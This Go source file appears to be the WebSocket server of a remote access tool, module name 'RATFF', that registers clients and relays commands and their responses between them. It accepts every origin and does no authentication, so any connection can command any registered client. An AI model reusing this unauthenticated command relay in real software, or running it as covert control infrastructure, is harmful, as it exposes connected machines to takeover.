package main

import (
	"net/http"
	"strings"

	"RATFF/shared"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"github.com/sirupsen/logrus"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

// handleWebSocket upgrades HTTP to WebSocket and manages the client connection.
func handleWebSocket(manager *ClientManager) gin.HandlerFunc {
	return func(c *gin.Context) {
		conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
		if err != nil {
			log.Error("WebSocket upgrade failed: ", err)
			return
		}
		defer conn.Close()

		wsConn := shared.NewWSConn(conn)
		shared.SetupSafeHeartbeat(wsConn)

		var msg shared.Message
		if err := shared.ReadWSMessage(conn, &msg); err != nil {
			log.Error("Read register message failed: ", err)
			return
		}

		if msg.Type != shared.MsgRegister {
			log.Error("First message must be register")
			return
		}

		clientID := msg.ClientID
		info := shared.ClientInfoFromPayload(msg.Payload)
		info.ID = clientID

		remoteAddr := c.Request.RemoteAddr
		if idx := strings.LastIndex(remoteAddr, ":"); idx != -1 {
			info.IP = remoteAddr[:idx]
		} else {
			info.IP = remoteAddr
		}

		manager.Register(clientID, wsConn, info)
		defer manager.Unregister(clientID)

		for {
			if err := handleMessage(wsConn, manager, clientID); err != nil {
				return
			}
		}
	}
}

// handleMessage processes incoming messages from a client connection.
func handleMessage(wsConn *shared.WSConn, manager *ClientManager, clientID string) error {
	var msg shared.Message
	if err := shared.ReadWSMessage(wsConn.Conn, &msg); err != nil {
		return err
	}

	log.WithFields(logrus.Fields{
		"client_id": clientID,
		"type":      msg.Type,
		"command":   msg.Command,
	}).Info("Received message")

	switch msg.Type {
	case shared.MsgHeartbeat:
		return shared.SendSafeWSMessage(wsConn, shared.NewMessage(shared.MsgHeartbeat, "", "", nil))

	case shared.MsgCommand:
		targetID := msg.ClientID
		if !manager.IsOnline(targetID) {
			err := shared.SendSafeWSMessage(wsConn, shared.NewMessage(shared.MsgError, "", "",
				map[string]interface{}{"error": "client offline"}))
			if err != nil {
				log.WithError(err).Error("Failed to send error message")
			}
			return nil
		}
		return manager.Send(targetID, msg)

	case shared.MsgResponse:
		manager.Broadcast(msg, clientID)

	case shared.MsgError:
		manager.Broadcast(msg, clientID)
	}

	return nil
}
